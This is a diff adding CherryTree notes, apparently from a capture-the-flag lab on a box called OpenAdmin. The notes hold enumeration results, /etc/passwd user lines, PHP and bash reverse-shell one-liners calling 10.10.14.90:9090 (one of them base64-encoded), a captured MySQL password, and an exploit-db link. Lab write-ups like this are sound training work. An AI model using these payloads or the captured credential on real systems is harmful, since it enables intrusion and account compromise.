@@ -1,0 +1,32 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="True" name="OpenAdmin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585477288.54" ts_lastsave="1585745677.2" unique_id="6">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585477293.16" ts_lastsave="1585749827.85" unique_id="7">
+			<rich_text> APACHE VERSION - Apache/2.4.29
+ 
+ DIRS : 
+    - /artwork =&gt; For artwork blog or something
+    - /server-status =&gt; Forbidden authentication required
+    - /music =&gt; For music blog or something
+    - /sierra =&gt; Another
+
+USERS : 
+    jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+    joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+    php -r '$sock=fsockopen(&quot;10.10.14.90&quot;,9090);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+    &lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.90/9090 0&gt;&amp;1'&quot;) ?&gt;
+    PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkwLzkwOTAgMD4mMSciKSA/Pgo=
+
+LOOTS : 
+    MySQL - ona_sys:n1nj4W4rri0R!
+    </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Exploit" prog_lang="custom-colors" readonly="False" tags="Exploit" ts_creation="1585745677.2" ts_lastsave="1585745725.61" unique_id="8">
+			<rich_text>Exploitable via </rich_text>
+			<rich_text link="webs https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</rich_text>
+			<rich_text>
+shell.sh</rich_text>
+		</node>
+	</node>
+</cherrytree>
